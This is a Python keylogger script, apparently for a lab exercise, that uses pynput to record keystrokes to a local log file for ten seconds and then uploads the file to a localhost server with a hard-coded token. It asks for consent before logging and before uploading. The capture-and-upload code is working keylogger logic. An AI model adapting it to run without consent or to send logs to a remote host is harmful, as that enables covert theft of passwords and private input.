from typing import List
from pynput.keyboard import Key, Listener
import threading
import time
import requests
import os
import sys

LOG_FILE = "log.txt"
RUN_SECONDS = 10

consent_text = """
WARNING (Consent required)
This program will record your keystrokes for testing and educational purposes.
Recorded data will be stored locally in './log.txt' and will be uploaded to
a lab server ONLY IF you explicitly agree.

Do you consent to start logging (yes/no)? 
Type 'yes' to continue, anything else to abort: 
"""
agree = input(consent_text).strip().lower()
if agree != "yes":
    print("Consent not given. Exiting.")
    sys.exit(0)

saved_keys: List[str] = []
char_count = 0

def on_press(key):
    try:
        print("Pressed:", key)
    except Exception:
        pass

def on_release(key):
    global saved_keys, char_count
    if key == Key.esc:
        return False
    if key == Key.enter or key == Key.space:
        write_to_file(saved_keys)
        saved_keys = []
        char_count = 0
    else:
        k = str(key).replace("'", "")
        saved_keys.append(k)
        char_count += 1

def write_to_file(keys: List[str]):
    if not keys:
        return
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        for k in keys:
            if "key" not in k.lower():
                f.write(k)
        f.write("\n")

def run_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

listener_thread = threading.Thread(target=run_listener, daemon=True)
listener_thread.start()

time.sleep(RUN_SECONDS)
print("Time elapsed. Stopping logger (if still running).")

if os.path.exists(LOG_FILE):
    print("\nLocal log file saved at ./{}".format(LOG_FILE))
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        data = f.read()
    preview = data[:1000]
    print("Preview (first 1000 chars):")
    print(preview.replace("\n", "\\n"))
else:
    print("No log file created (maybe no printable keys were pressed).")

upload = input("\nUpload log.txt to lab server? (yes/no): ").strip().lower()
if upload != "yes":
    print("Upload aborted by user. Exiting.")
    sys.exit(0)

SERVER_URL = "http://127.0.0.1:5000/upload"
API_TOKEN = "LAB_SECRET_TOKEN_ABC123"

def upload_file(path):
    headers = {"Authorization": f"Bearer {API_TOKEN}"}
    with open(path, "rb") as fh:
        files = {"file": ("log.txt", fh, "text/plain")}
        try:
            resp = requests.post(SERVER_URL, files=files, headers=headers, timeout=10)
            if resp.status_code == 200:
                print("Upload successful:", resp.text)
            else:
                print("Upload failed:", resp.status_code, resp.text)
        except Exception as e:
            print("Upload error:", e)

upload_file(LOG_FILE)
print("Done. Remember to delete the log file if it contains sensitive information.")
